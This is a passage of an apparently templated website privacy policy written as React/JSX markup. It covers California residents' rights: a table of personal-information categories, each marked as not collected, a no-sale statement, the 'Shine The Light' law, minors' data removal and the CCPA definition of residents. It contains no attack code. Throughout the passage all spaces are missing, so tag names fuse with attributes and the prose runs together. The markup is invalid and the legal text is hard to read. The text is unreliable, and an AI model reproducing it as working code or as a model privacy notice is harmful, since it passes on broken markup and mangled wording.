,89)',}}><spandata-custom-class='body_text'><strong><em>InShort:&nbsp;</em></strong><em>Ifyouarearesidentof{''}<bdtclassName='forloop-component'/><bdtclassName='block-component'/><bdtclassName='forloop-component'/>{''}California<bdtclassName='forloop-component'/><bdtclassName='forloop-component'/><bdtclassName='forloop-component'/><bdtclassName='forloop-component'/><bdtclassName='block-component'/><bdtclassName='forloop-component'/>,youaregrantedspecificrightsregardingaccesstoyourpersonalinformation.</em></span></span></span></div><divstyle={{lineHeight:'1.5',}}><br/></div><divstyle={{lineHeight:'1.5',}}><spanstyle={{fontSize:15,color:'rgb(89,89,89)',}}><spanstyle={{fontSize:15,color:'rgb(89,89,89)',}}><spandata-custom-class='body_text'><strong>Whatcategoriesofpersonalinformationdowecollect?</strong></span></span></span></div><divstyle={{lineHeight:'1.5',}}><br/></div><divstyle={{lineHeight:'1.5',}}><spanstyle={{fontSize:15,color:'rgb(89,89,89)',}}><spanstyle={{fontSize:15,color:'rgb(89,89,89)',}}><spandata-custom-class='body_text'>Wehavecollectedthefollowingcategoriesofpersonalinformationinthepasttwelve(12)months:</span></span></span></div><divstyle={{lineHeight:'1.5',}}><br/></div><tablestyle={{width:'100%',}}><tbody><tr><tdstyle={{width:'33.8274%',borderLeft:'1pxsolidblack',borderRight:'1pxsolidblack',borderTop:'1pxsolidblack',}}><spanstyle={{fontSize:15,color:'rgb(89,89,89)',}}><spanstyle={{fontSize:15,color:'rgb(89,89,89)',}}><spandata-custom-class='body_text'><strong>Category</strong></span></span></span></td><tdstyle={{width:'51.4385%',borderTop:'1pxsolidblack',borderRight:'1pxsolidblack',}}><spanstyle={{fontSize:15,color:'rgb(89,89,89)',}}><spanstyle={{fontSize:15,color:'rgb(89,89,89)',}}><spandata-custom-class='body_text'><strong>Examples</strong></span></span></span></td><tdstyle={{width:'14.9084%',borderRight:'1pxsolidblack',borderTop:'1pxsolidblack',textAlign:'center',}}><spanstyle={{fontSize:15,color:'rgb(89,89,89)',}}><spanstyle={{fontSize:15,color:'rgb(89,89,89)',}}><spandata-custom-class='body_text'><strong>Collected</strong></span></span></span></td></tr><tr><tdstyle={{width:'33.8274%',borderLeft:'1pxsolidblack',borderRight:'1pxsolidblack',borderTop:'1pxsolidblack',}}><divstyle={{lineHeight:'1.5',}}><spanstyle={{fontSize:15,color:'rgb(89,89,89)',}}><spanstyle={{fontSize:15,color:'rgb(89,89,89)',}}><spandata-custom-class='body_text'>A.Identifiers</span></span></span></div></td><tdstyle={{width:'51.4385%',borderTop:'1pxsolidblack',borderRight:'1pxsolidblack',}}><divstyle={{lineHeight:'1.5',}}><spanstyle={{fontSize:15,color:'rgb(89,89,89)',}}><spanstyle={{fontSize:15,color:'rgb(89,89,89)',}}><spandata-custom-class='body_text'>Contactdetails,suchasrealname,alias,postaladdress,telephoneormobilecontactnumber,uniquepersonalidentifier,onlineidentifier,InternetProtocoladdress,emailaddress,andaccountname</span></span></span></div></td><tdstyle={{width:'14.9084%',textAlign:'center',verticalAlign:'middle',borderRight:'1pxsolidblack',borderTop:'1pxsolidblack',}}><divstyle={{lineHeight:'1.5',}}><br/></div><divstyle={{lineHeight:'1.5',}}><spanstyle={{fontSize:15,color:'rgb(89,89,89)',}}><spanstyle={{fontSize:15,color:'rgb(89,89,89)',}}><spandata-custom-class='body_text'><bdtclassName='block-component'><bdtclassName='block-component'/></bdt>NO<bdtclassName='statement-end-if-in-editor'><bdtclassName='block-component'/></bdt></span></span></span></div><divstyle={{lineHeight:'1.5',}}><br/></div></td></tr></tbody></table><divstyle={{lineHeight:'1.5',}}><bdtclassName='block-component'/></div><tablestyle={{width:'100%',}}><tbody><tr><tdstyle={{width:'33.8274%',borderLeft:'1pxsolidblack',borderRight:'1pxsolidblack',borderTop:'1pxsolidblack',}}><divstyle={{lineHeight:'1.5',}}><spanstyle={{fontSize:15,color:'rgb(89,89,89)',}}><spanstyle={{fontSize:15,color:'rgb(89,89,89)',}}><spandata-custom-class='body_text'>B.PersonalinformationasdefinedintheCaliforniaCustomerRecordsstatute</span></span></span></div></td><tdstyle={{width:'51.4385%',borderRight:'1pxsolidblack',borderTop:'1pxsolidblack',}}><divstyle={{lineHeight:'1.5',}}><spanstyle={{fontSize:15,color:'rgb(89,89,89)',}}><spanstyle={{fontSize:15,color:'rgb(89,89,89)',}}><spandata-custom-class='body_text'>Name,contactinformation,education,employment,employmenthistory,andfinancialinformation</span></span></span></div></td><tdstyle={{width:'14.9084%',textAlign:'center',borderRight:'1pxsolidblack',borderTop:'1pxsolidblack',}}><divstyle={{lineHeight:'1.5',}}><br/></div><divstyle={{lineHeight:'1.5',}}><spanstyle={{fontSize:15,color:'rgb(89,89,89)',}}><spanstyle={{fontSize:15,color:'rgb(89,89,89)',}}><spandata-custom-class='body_text'><bdtclassName='forloop-component'><bdtclassName='block-component'><bdtclassName='block-component'>NO<bdtclassName='statement-end-if-in-editor'><bdtclassName='block-component'/></bdt></bdt></bdt></bdt></span></span></span></div><divstyle={{lineHeight:'1.5',}}><br/></div></td></tr></tbody></table><divstyle={{lineHeight:'1.5',}}><bdtclassName='block-component'/></div><tablestyle={{width:'100%',}}><tbody><tr><tdstyle={{width:'33.8274%',borderLeft:'1pxsolidblack',borderRight:'1pxsolidblack',borderTop:'1pxsolidblack',}}><divstyle={{lineHeight:'1.5',}}><spanstyle={{fontSize:15,color:'rgb(89,89,89)',}}><spanstyle={{fontSize:15,color:'rgb(89,89,89)',}}><spandata-custom-class='body_text'><bdtclassName='block-component'/>C<bdtclassName='else-block'/>.Protectedclassificationcharacteristicsunderstateorfederallaw</span></span></span></div></td><tdstyle={{width:'51.4385%',borderRight:'1pxsolidblack',borderTop:'1pxsolidblack',}}><divstyle={{lineHeight:'1.5',}}><spanstyle={{fontSize:15,color:'rgb(89,89,89)',}}><spanstyle={{fontSize:15,color:'rgb(89,89,89)',}}><spandata-custom-class='body_text'>Genderanddateofbirth</span></span></span></div></td><tdstyle={{width:'14.9084%',textAlign:'center',borderRight:'1pxsolidblack',borderTop:'1pxsolidblack',}}><divstyle={{lineHeight:'1.5',}}><br/></div><divdata-custom-class='body_text'style={{lineHeight:'1.5',}}><bdtclassName='forloop-component'><spandata-custom-class='body_text'><bdtclassName='block-component'/><bdtclassName='block-component'/>NO<bdtclassName='statement-end-if-in-editor'/><bdtclassName='block-component'/></span></bdt></div><divstyle={{lineHeight:'1.5',}}><br/></div></td></tr><tr><tdstyle={{width:'33.8274%',borderLeft:'1pxsolidblack',borderRight:'1pxsolidblack',borderTop:'1pxsolidblack',}}><divstyle={{lineHeight:'1.5',}}><spanstyle={{fontSize:15,color:'rgb(89,89,89)',}}><spanstyle={{fontSize:15,color:'rgb(89,89,89)',}}><spandata-custom-class='body_text'><bdtclassName='block-component'/>D<bdtclassName='else-block'/>.Commercialinformation</span></span></span></div></td><tdstyle={{width:'51.4385%',borderRight:'1pxsolidblack',borderTop:'1pxsolidblack',}}><divstyle={{lineHeight:'1.5',}}><spanstyle={{fontSize:15,color:'rgb(89,89,89)',}}><spanstyle={{fontSize:15,color:'rgb(89,89,89)',}}><spandata-custom-class='body_text'>Transactioninformation,purchasehistory,financialdetails,andpaymentinformation</span></span></span></div></td><tdstyle={{width:'14.9084%',textAlign:'center',borderRight:'1pxsolidblack',borderTop:'1pxsolidblack',}}><divstyle={{lineHeight:'1.5',}}><br/></div><divdata-custom-class='body_text'style={{lineHeight:'1.5',}}><bdtclassName='forloop-component'><spandata-custom-class='body_text'><bdtclassName='block-component'/><bdtclassName='block-component'/>NO<bdtclassName='statement-end-if-in-editor'><bdtclassName='block-component'/></bdt></span></bdt></div><divstyle={{lineHeight:'1.5',}}><br/></div></td></tr><tr><tdstyle={{width:'33.8274%',borderLeft:'1pxsolidblack',borderRight:'1pxsolidblack',borderTop:'1pxsolidblack',}}><divstyle={{lineHeight:'1.5',}}><spanstyle={{fontSize:15,color:'rgb(89,89,89)',}}><spanstyle={{fontSize:15,color:'rgb(89,89,89)',}}><spandata-custom-class='body_text'><bdtclassName='block-component'/>E<bdtclassName='else-block'/>.Biometricinformation</span></span></span></div></td><tdstyle={{width:'51.4385%',borderRight:'1pxsolidblack',borderTop:'1pxsolidblack',}}><divstyle={{lineHeight:'1.5',}}><spanstyle={{fontSize:15,color:'rgb(89,89,89)',}}><spanstyle={{fontSize:15,color:'rgb(89,89,89)',}}><spandata-custom-class='body_text'>Fingerprintsandvoiceprints</span></span></span></div></td><tdstyle={{width:'14.9084%',textAlign:'center',borderRight:'1pxsolidblack',borderTop:'1pxsolidblack',}}><divstyle={{lineHeight:'1.5',}}><br/></div><divdata-custom-class='body_text'style={{lineHeight:'1.5',}}><bdtclassName='forloop-component'><spandata-custom-class='body_text'><bdtclassName='block-component'><bdtclassName='block-component'>NO</bdt><bdtclassName='statement-end-if-in-editor'/><bdtclassName='block-component'/></bdt></span></bdt></div><divstyle={{lineHeight:'1.5',}}><br/></div></td></tr><tr><tdstyle={{width:'33.8274%',borderLeft:'1pxsolidblack',borderRight:'1pxsolidblack',borderTop:'1pxsolidblack',}}><divstyle={{lineHeight:'1.5',}}><spanstyle={{fontSize:15,color:'rgb(89,89,89)',}}><spanstyle={{fontSize:15,color:'rgb(89,89,89)',}}><spandata-custom-class='body_text'><bdtclassName='block-component'/>F<bdtclassName='else-block'/>.Internetorothersimilarnetworkactivity</span></span></span></div></td><tdstyle={{width:'51.4385%',borderRight:'1pxsolidblack',borderTop:'1pxsolidblack',}}><divstyle={{lineHeight:'1.5',}}><spanstyle={{fontSize:15,color:'rgb(89,89,89)',}}><spanstyle={{fontSize:15,color:'rgb(89,89,89)',}}><spandata-custom-class='body_text'>Browsinghistory,searchhistory,online{''}<bdtclassName='block-component'/>behavior<bdtclassName='statement-end-if-in-editor'/>,interestdata,andinteractionswithourandotherwebsites,applications,systems,andadvertisements</span></span></span></div></td><tdstyle={{width:'14.9084%',textAlign:'center',borderRight:'1pxsolidblack',borderTop:'1pxsolidblack',}}><divstyle={{lineHeight:'1.5',}}><br/></div><divdata-custom-class='body_text'style={{lineHeight:'1.5',}}><bdtclassName='forloop-component'><spandata-custom-class='body_text'><bdtclassName='block-component'/><bdtclassName='block-component'/>NO<bdtclassName='statement-end-if-in-editor'/><bdtclassName='block-component'/></span></bdt></div><divstyle={{lineHeight:'1.5',}}><br/></div></td></tr><tr><tdstyle={{width:'33.8274%',borderLeft:'1pxsolidblack',borderRight:'1pxsolidblack',borderTop:'1pxsolidblack',}}><divstyle={{lineHeight:'1.5',}}><spanstyle={{fontSize:15,color:'rgb(89,89,89)',}}><spanstyle={{fontSize:15,color:'rgb(89,89,89)',}}><spandata-custom-class='body_text'><bdtclassName='block-component'/>G<bdtclassName='else-block'/>.Geolocationdata</span></span></span></div></td><tdstyle={{width:'51.4385%',borderRight:'1pxsolidblack',borderTop:'1pxsolidblack',}}><divstyle={{lineHeight:'1.5',}}><spanstyle={{fontSize:15,color:'rgb(89,89,89)',}}><spanstyle={{fontSize:15,color:'rgb(89,89,89)',}}><spandata-custom-class='body_text'>Devicelocation</span></span></span></div></td><tdstyle={{width:'14.9084%',textAlign:'center',borderRight:'1pxsolidblack',borderTop:'1pxsolidblack',}}><divstyle={{lineHeight:'1.5',}}><br/></div><divdata-custom-class='body_text'style={{lineHeight:'1.5',}}><bdtclassName='forloop-component'><spandata-custom-class='body_text'><bdtclassName='block-component'/><bdtclassName='block-component'/>NO<bdtclassName='statement-end-if-in-editor'/><bdtclassName='block-component'/></span></bdt></div><divstyle={{lineHeight:'1.5',}}><br/></div></td></tr><tr><tdstyle={{width:'33.8274%',borderLeft:'1pxsolidblack',borderRight:'1pxsolidblack',borderTop:'1pxsolidblack',}}><divstyle={{lineHeight:'1.5',}}><spanstyle={{fontSize:15,color:'rgb(89,89,89)',}}><spanstyle={{fontSize:15,color:'rgb(89,89,89)',}}><spandata-custom-class='body_text'><bdtclassName='block-component'/>H<bdtclassName='else-block'/>.Audio,electronic,visual,thermal,olfactory,orsimilarinformation</span></span></span></div></td><tdstyle={{width:'51.4385%',borderRight:'1pxsolidblack',borderTop:'1pxsolidblack',}}><divstyle={{lineHeight:'1.5',}}><spanstyle={{fontSize:15,color:'rgb(89,89,89)',}}><spanstyle={{fontSize:15,color:'rgb(89,89,89)',}}><spandata-custom-class='body_text'>Imagesandaudio,videoorcallrecordingscreatedinconnectionwithourbusinessactivities</span></span></span></div></td><tdstyle={{width:'14.9084%',textAlign:'center',borderRight:'1pxsolidblack',borderTop:'1pxsolidblack',}}><divstyle={{lineHeight:'1.5',}}><br/></div><divdata-custom-class='body_text'style={{lineHeight:'1.5',}}><bdtclassName='forloop-component'><spandata-custom-class='body_text'><bdtclassName='block-component'/><bdtclassName='block-component'/>NO<bdtclassName='statement-end-if-in-editor'/><bdtclassName='block-component'/></span></bdt></div><divstyle={{lineHeight:'1.5',}}><br/></div></td></tr><tr><tdstyle={{width:'33.8274%',borderLeft:'1pxsolidblack',borderRight:'1pxsolidblack',borderTop:'1pxsolidblack',}}><divstyle={{lineHeight:'1.5',}}><spanstyle={{fontSize:15,color:'rgb(89,89,89)',}}><spanstyle={{fontSize:15,color:'rgb(89,89,89)',}}><spandata-custom-class='body_text'><bdtclassName='block-component'/>I<bdtclassName='else-block'/>.Professionaloremployment-relatedinformation</span></span></span></div></td><tdstyle={{width:'51.4385%',borderRight:'1pxsolidblack',borderTop:'1pxsolidblack',}}><divstyle={{lineHeight:'1.5',}}><spanstyle={{fontSize:15,color:'rgb(89,89,89)',}}><spanstyle={{fontSize:15,color:'rgb(89,89,89)',}}><spandata-custom-class='body_text'>BusinesscontactdetailsinordertoprovideyouourServicesatabusinesslevelorjobtitle,workhistory,andprofessionalqualificationsifyouapplyforajobwithus</span></span></span></div></td><tdstyle={{width:'14.9084%',textAlign:'center',borderRight:'1pxsolidblack',borderTop:'1pxsolidblack',}}><divstyle={{lineHeight:'1.5',}}><br/></div><divdata-custom-class='body_text'style={{lineHeight:'1.5',}}><bdtclassName='forloop-component'><spandata-custom-class='body_text'><bdtclassName='block-component'/><bdtclassName='block-component'/>NO<bdtclassName='statement-end-if-in-editor'/><bdtclassName='block-component'/></span></bdt></div><divstyle={{lineHeight:'1.5',}}><br/></div></td></tr><tr><tdstyle={{borderLeft:'1pxsolidblack',borderRight:'1pxsolidblack',borderTop:'1pxsolidblack',width:'33.8274%',}}><divstyle={{lineHeight:'1.5',}}><spanstyle={{fontSize:15,color:'rgb(89,89,89)',}}><spanstyle={{fontSize:15,color:'rgb(89,89,89)',}}><spandata-custom-class='body_text'><bdtclassName='block-component'/>J<bdtclassName='else-block'/>.EducationInformation</span></span></span></div></td><tdstyle={{borderRight:'1pxsolidblack',borderTop:'1pxsolidblack',width:'51.4385%',}}><divstyle={{lineHeight:'1.5',}}><spanstyle={{fontSize:15,color:'rgb(89,89,89)',}}><spanstyle={{fontSize:15,color:'rgb(89,89,89)',}}><spandata-custom-class='body_text'>Studentrecordsanddirectoryinformation</span></span></span></div></td><tdstyle={{textAlign:'center',borderRight:'1pxsolidblack',borderTop:'1pxsolidblack',width:'14.9084%',}}><divstyle={{lineHeight:'1.5',}}><br/></div><divdata-custom-class='body_text'style={{lineHeight:'1.5',}}><bdtclassName='forloop-component'><spandata-custom-class='body_text'><bdtclassName='block-component'/><bdtclassName='block-component'/>NO<bdtclassName='statement-end-if-in-editor'/><bdtclassName='block-component'/></span></bdt></div><divstyle={{lineHeight:'1.5',}}><br/></div></td></tr><tr><tdstyle={{borderWidth:1,borderColor:'black',borderStyle:'solid',width:'33.8274%',}}><divstyle={{lineHeight:'1.5',}}><spanstyle={{fontSize:15,color:'rgb(89,89,89)',}}><spanstyle={{fontSize:15,color:'rgb(89,89,89)',}}><spandata-custom-class='body_text'><bdtclassName='block-component'/>K<bdtclassName='else-block'/>.Inferencesdrawnfromcollectedpersonalinformation</span></span></span></div></td><tdstyle={{borderBottom:'1pxsolidblack',borderTop:'1pxsolidblack',borderRight:'1pxsolidblack',width:'51.4385%',}}><divstyle={{lineHeight:'1.5',}}><spanstyle={{fontSize:15,color:'rgb(89,89,89)',}}><spanstyle={{fontSize:15,color:'rgb(89,89,89)',}}><spandata-custom-class='body_text'>Inferencesdrawnfromanyofthecollectedpersonalinformationlistedabovetocreateaprofileorsummaryabout,forexample,anindividual’spreferencesandcharacteristics</span></span></span></div></td><tdstyle={{textAlign:'center',borderRight:'1pxsolidblack',borderBottom:'1pxsolidblack',borderTop:'1pxsolidblack',width:'14.9084%',}}><divstyle={{lineHeight:'1.5',}}><br/></div><divdata-custom-class='body_text'style={{lineHeight:'1.5',}}><spandata-custom-class='body_text'><bdtclassName='block-component'/>NO<spanstyle={{fontSize:15,color:'rgb(89,89,89)',}}><spanstyle={{fontSize:15,color:'rgb(89,89,89)',}}><spandata-custom-class='body_text'><spanstyle={{color:'rgb(89,89,89)',}}><spandata-custom-class='body_text'><bdtclassName='statement-end-if-in-editor'/></span></span></span></span></span></span></div><divstyle={{lineHeight:'1.5',}}><br/></div></td></tr><tr><tdstyle={{borderLeft:'1pxsolidblack',borderRight:'1pxsolidblack',borderBottom:'1pxsolidblack',lineHeight:'1.5',}}><spandata-custom-class='body_text'><bdtclassName='block-component'/>L<bdtclassName='else-block'/>.SensitivepersonalInformation</span></td><tdstyle={{borderRight:'1pxsolidblack',borderBottom:'1pxsolidblack',lineHeight:'1.5',}}><bdtclassName='block-component'><spandata-custom-class='body_text'/></bdt></td><tdstyle={{borderRight:'1pxsolidblack',borderBottom:'1pxsolidblack',}}><divdata-empty='true'style={{textAlign:'center',}}><br/></div><divdata-custom-class='body_text'data-empty='true'style={{textAlign:'center',lineHeight:'1.5',}}><bdtclassName='block-component'><spandata-custom-class='body_text'/></bdt>NO<bdtclassName='statement-end-if-in-editor'><spandata-custom-class='body_text'/></bdt></div><divdata-empty='true'style={{textAlign:'center',}}><br/></div></td></tr></tbody></table><divstyle={{lineHeight:'1.5',}}><br/></div><divstyle={{lineHeight:'1.5',}}><bdtclassName='block-component'><spandata-custom-class='body_text'/></bdt><divstyle={{lineHeight:'1.5',}}><spanstyle={{fontSize:15,color:'rgb(89,89,89)',}}><spanstyle={{fontSize:15,color:'rgb(89,89,89)',}}><spandata-custom-class='body_text'><bdtclassName='block-component'/></span></span></span></div><divstyle={{lineHeight:'1.5',}}><spanstyle={{fontSize:15,color:'rgb(89,89,89)',}}><spanstyle={{fontSize:15,color:'rgb(89,89,89)',}}><spandata-custom-class='body_text'>Wemayalsocollectotherpersonalinformationoutsideofthesecategoriesthroughinstanceswhereyouinteractwithusinperson,online,orbyphoneormailinthecontextof:<spanstyle={{fontSize:15,color:'rgb(89,89,89)',}}><spanstyle={{fontSize:15,color:'rgb(89,89,89)',}}><spandata-custom-class='body_text'><spanstyle={{color:'rgb(89,89,89)',fontSize:15,}}><spandata-custom-class='body_text'><bdtclassName='block-component'/></span></span></span></span></span></span></span></span></div><ul><listyle={{lineHeight:'1.5',}}><spanstyle={{fontSize:15,color:'rgb(89,89,89)',}}><spanstyle={{fontSize:15,color:'rgb(89,89,89)',}}><spandata-custom-class='body_text'>Receivinghelpthroughourcustomersupportchannels;</span><spandata-custom-class='body_text'><spanstyle={{fontSize:15,color:'rgb(89,89,89)',}}><spanstyle={{fontSize:15,color:'rgb(89,89,89)',}}><spandata-custom-class='body_text'><spanstyle={{color:'rgb(89,89,89)',fontSize:15,}}><spandata-custom-class='body_text'><spanstyle={{color:'rgb(89,89,89)',fontSize:15,}}><spandata-custom-class='body_text'><spanstyle={{fontSize:15,}}><spanstyle={{color:'rgb(89,89,89)',}}><spandata-custom-class='body_text'><bdtclassName='statement-end-if-in-editor'/></span></span></span></span></span></span></span></span></span></span></span></span></span></li></ul><div><spanstyle={{fontSize:15,color:'rgb(89,89,89)',}}><spanstyle={{fontSize:15,color:'rgb(89,89,89)',}}><spandata-custom-class='body_text'><spanstyle={{fontSize:15,color:'rgb(89,89,89)',}}><spanstyle={{fontSize:15,color:'rgb(89,89,89)',}}><spandata-custom-class='body_text'><spanstyle={{color:'rgb(89,89,89)',fontSize:15,}}><spandata-custom-class='body_text'><bdtclassName='block-component'/></span></span></span></span></span></span></span></span></div><ul><listyle={{lineHeight:'1.5',}}><spanstyle={{fontSize:15,color:'rgb(89,89,89)',}}><spanstyle={{fontSize:15,color:'rgb(89,89,89)',}}><spandata-custom-class='body_text'>Participationincustomersurveysorcontests;and</span><spandata-custom-class='body_text'><spanstyle={{fontSize:15,color:'rgb(89,89,89)',}}><spanstyle={{fontSize:15,color:'rgb(89,89,89)',}}><spandata-custom-class='body_text'><spanstyle={{color:'rgb(89,89,89)',fontSize:15,}}><spandata-custom-class='body_text'><spanstyle={{color:'rgb(89,89,89)',fontSize:15,}}><spandata-custom-class='body_text'><spanstyle={{fontSize:15,}}><spanstyle={{color:'rgb(89,89,89)',}}><spandata-custom-class='body_text'><bdtclassName='statement-end-if-in-editor'/></span></span></span></span></span></span></span></span></span></span></span></span></span></li></ul><div><spanstyle={{fontSize:15,color:'rgb(89,89,89)',}}><spanstyle={{fontSize:15,color:'rgb(89,89,89)',}}><spandata-custom-class='body_text'><spanstyle={{fontSize:15,color:'rgb(89,89,89)',}}><spanstyle={{fontSize:15,color:'rgb(89,89,89)',}}><spandata-custom-class='body_text'><spanstyle={{color:'rgb(89,89,89)',fontSize:15,}}><spandata-custom-class='body_text'><bdtclassName='block-component'/></span></span></span></span></span></span></span></span></div><ul><listyle={{lineHeight:'1.5',}}><spanstyle={{fontSize:15,color:'rgb(89,89,89)',}}><spanstyle={{fontSize:15,color:'rgb(89,89,89)',}}><spandata-custom-class='body_text'>FacilitationinthedeliveryofourServicesandtorespondtoyourinquiries.</span><spandata-custom-class='body_text'><spanstyle={{fontSize:15,color:'rgb(89,89,89)',}}><spanstyle={{fontSize:15,color:'rgb(89,89,89)',}}><spandata-custom-class='body_text'><spanstyle={{color:'rgb(89,89,89)',fontSize:15,}}><spandata-custom-class='body_text'><spanstyle={{color:'rgb(89,89,89)',fontSize:15,}}><spandata-custom-class='body_text'><spanstyle={{fontSize:15,}}><spanstyle={{color:'rgb(89,89,89)',}}><spandata-custom-class='body_text'><bdtclassName='statement-end-if-in-editor'/></span></span></span></span></span></span></span></span></span></span></span></span></span></li></ul><divstyle={{lineHeight:'1.5',}}><spanstyle={{fontSize:15,color:'rgb(89,89,89)',}}><spanstyle={{fontSize:15,color:'rgb(89,89,89)',}}><spandata-custom-class='body_text'><strong>Howdoweuseandshareyourpersonalinformation?</strong></span></span></span></div><divstyle={{lineHeight:'1.5',}}><br/></div><divstyle={{lineHeight:'1.5',}}><spandata-custom-class='body_text'style={{fontSize:15,}}>Learnabouthowweuseyourpersonalinformationinthesection,{''}<bdtclassName='block-component'/>&quot;<bdtclassName='statement-end-if-in-editor'/></span><adata-custom-class='link'href='#infouse'><spanstyle={{color:'rgb(0,58,250)',fontSize:15,}}>HOWDOWEPROCESSYOURINFORMATION?</span></a><spandata-custom-class='body_text'style={{fontSize:15,}}><bdtclassName='block-component'/>&quot;</span><bdtclassName='statement-end-if-in-editor'><spandata-custom-class='body_text'style={{fontSize:15,}}/></bdt></div><divstyle={{lineHeight:'1.5',}}><br/></div><divstyle={{lineHeight:'1.5',}}><spanstyle={{fontSize:15,color:'rgb(89,89,89)',}}><spanstyle={{fontSize:15,color:'rgb(89,89,89)',}}><spandata-custom-class='body_text'><spanstyle={{color:'rgb(89,89,89)',fontSize:15,}}><spandata-custom-class='body_text'><bdtclassName='block-component'/></span></span></span></span></span></div><divstyle={{lineHeight:'1.5',}}><spanstyle={{fontSize:15,color:'rgb(89,89,89)',}}><spanstyle={{fontSize:15,color:'rgb(89,89,89)',}}><spandata-custom-class='body_text'><strong>Willyourinformationbesharedwithanyoneelse?</strong></span></span></span></div><divstyle={{lineHeight:'1.5',}}><br/></div><divstyle={{lineHeight:'1.5',}}><spanstyle={{fontSize:15,color:'rgb(89,89,89)',}}><spanstyle={{fontSize:15,color:'rgb(89,89,89)',}}><spandata-custom-class='body_text'>Wemaydiscloseyourpersonalinformationwithourserviceproviderspursuanttoawrittencontractbetweenusandeachserviceprovider.Learnmoreabouthowwedisclosepersonalinformationtointhesection,{''}<bdtclassName='block-component'/>&quot;<bdtclassName='statement-end-if-in-editor'/></span></span></span><adata-custom-class='link'href='#whoshare'><spanstyle={{fontSize:15,color:'rgb(0,58,250)',}}><spanstyle={{fontSize:15,color:'rgb(0,58,250)',}}>WHENANDWITHWHOMDOWESHAREYOURPERSONALINFORMATION?</span></span></a><spanstyle={{fontSize:15,color:'rgb(89,89,89)',}}><spanstyle={{fontSize:15,color:'rgb(89,89,89)',}}><spandata-custom-class='body_text'><bdtclassName='block-component'/>&quot;<bdtclassName='statement-end-if-in-editor'/></span></span></span></div><divstyle={{lineHeight:'1.5',}}><br/></div><divstyle={{lineHeight:'1.5',}}><spanstyle={{fontSize:15,color:'rgb(89,89,89)',}}><spanstyle={{fontSize:15,color:'rgb(89,89,89)',}}><spandata-custom-class='body_text'>Wemayuseyourpersonalinformationforourownbusinesspurposes,suchasforundertakinginternalresearchfortechnologicaldevelopmentanddemonstration.Thisisnotconsideredtobe{''}<bdtclassName='block-component'/>&quot;selling&quot;<bdtclassName='statement-end-if-in-editor'/>{''}ofyourpersonalinformation.<spanstyle={{color:'rgb(89,89,89)',fontSize:15,}}><spandata-custom-class='body_text'><bdtclassName='block-component'/></span></span></span></span></span></div><divstyle={{lineHeight:'1.5',}}><br/></div><divstyle={{lineHeight:'1.5',}}><spanstyle={{fontSize:15,color:'rgb(89,89,89)',}}><spanstyle={{fontSize:15,color:'rgb(89,89,89)',}}><spandata-custom-class='body_text'>Wehavenotdisclosed,sold,orsharedanypersonalinformationtothirdpartiesforabusinessorcommercialpurposeintheprecedingtwelve(12)months.We<spanstyle={{color:'rgb(89,89,89)',}}>&nbsp;</span>willnotsellorsharepersonalinformationinthefuturebelongingtowebsitevisitors,users,andotherconsumers.<spanstyle={{color:'rgb(89,89,89)',}}><spandata-custom-class='body_text'><spanstyle={{color:'rgb(89,89,89)',}}><spandata-custom-class='body_text'><spanstyle={{color:'rgb(89,89,89)',}}><spandata-custom-class='body_text'><bdtclassName='statement-end-if-in-editor'/></span></span></span></span><bdtclassName='block-component'/></span></span></span></span></span><spandata-custom-class='body_text'><spanstyle={{color:'rgb(0,0,0)',}}><spandata-custom-class='body_text'><bdtclassName='block-component'/></span></span></span><bdtclassName='block-component'/></div><divstyle={{lineHeight:'1.5',}}><br/></div><divstyle={{lineHeight:'1.5',}}><strong><spandata-custom-class='heading_2'style={{fontSize:15,}}>CaliforniaResidents</span></strong></div><divstyle={{lineHeight:'1.5',}}><br/></div><divstyle={{lineHeight:'1.5',}}><spandata-custom-class='body_text'style={{fontSize:15,}}>CaliforniaCivilCodeSection1798.83,alsoknownasthe{''}<bdtclassName='block-component'/>&quot;ShineTheLight&quot;<bdtclassName='statement-end-if-in-editor'/>{''}lawpermitsouruserswhoareCaliforniaresidentstorequestandobtainfromus,onceayearandfreeofcharge,informationaboutcategoriesofpersonalinformation(ifany)wedisclosedtothirdpartiesfordirectmarketingpurposesandthenamesandaddressesofallthirdpartieswithwhichwesharedpersonalinformationintheimmediatelyprecedingcalendaryear.IfyouareaCaliforniaresidentandwouldliketomakesucharequest,pleasesubmityourrequestinwritingtoususingthecontactinformationprovidedbelow.</span></div><divstyle={{lineHeight:'1.5',}}><spanstyle={{fontSize:15,}}><spandata-custom-class='body_text'><br/></span></span></div><divstyle={{lineHeight:'1.5',}}><spandata-custom-class='body_text'style={{fontSize:15,}}>Ifyouareunder18yearsofage,resideinCalifornia,andhavearegisteredaccountwiththeServices,youhavetherighttorequestremovalofunwanteddatathatyoupubliclypostontheServices.Torequestremovalofsuchdata,pleasecontactususingthecontactinformationprovidedbelowandincludetheemailaddressassociatedwithyouraccountandastatementthatyouresideinCalifornia.WewillmakesurethedataisnotpubliclydisplayedontheServices,butpleasebeawarethatthedatamaynotbecompletelyorcomprehensivelyremovedfromalloursystems(e.g.<bdtclassName='block-component'/>,<bdtclassName='statement-end-if-in-editor'/>{''}backups,etc.).</span></div><divstyle={{lineHeight:'1.5',}}><spanstyle={{fontSize:15,}}><br/></span></div><divstyle={{lineHeight:'1.5',}}><spanstyle={{fontSize:15,}}><spandata-custom-class='body_text'><strong><u>CCPAPrivacyNotice</u></strong></span></span></div><divstyle={{lineHeight:'1.5',}}><spanstyle={{fontSize:15,}}><spandata-custom-class='body_text'><br/></span></span></div><divstyle={{lineHeight:'1.5',}}><spanstyle={{fontSize:15,}}><spandata-custom-class='body_text'>ThissectionappliesonlytoCaliforniaresidents.UndertheCaliforniaConsumerPrivacyAct(CCPA),youhavetherightslistedbelow.</span></span></div><divstyle={{lineHeight:'1.5',}}><spanstyle={{fontSize:15,}}><spandata-custom-class='body_text'><br/></span></span></div><divstyle={{lineHeight:'1.5',}}><spanstyle={{fontSize:15,}}><spandata-custom-class='body_text'>TheCaliforniaCodeofRegulationsdefinesa{''}<bdtclassName='block-component'/>&quot;residents&quot;<bdtclassName='statement-end-if-in-editor'/>{''}as:</span></span></div><divstyle={{lineHeight:'1.5',}}><spanstyle={{fontSize:15,}}><spandata-custom-class='body_text'><br/></span></span></div><divstyle={{marginLeft:20,lineHeight:'1.5',}}><spanstyle={{fontSize:15,}}><spandata-custom-class='body_text'>(1)everyindividualwhoisintheStateofCaliforniaforotherthanatemporaryortransitorypurposeand</span></span></div><divstyle={{marginLeft:20,lineHeight:'1.5',}}><spanstyle={{fontSize:15,}}><spandata-custom-class='body_text'>(2)everyindividualwhoisdomiciledintheStateofCaliforniawhoisoutsidetheStateofCaliforniaforatemporaryortransitorypurpose</span></span></div><divstyle={{lineHeight:'1.5',}}><span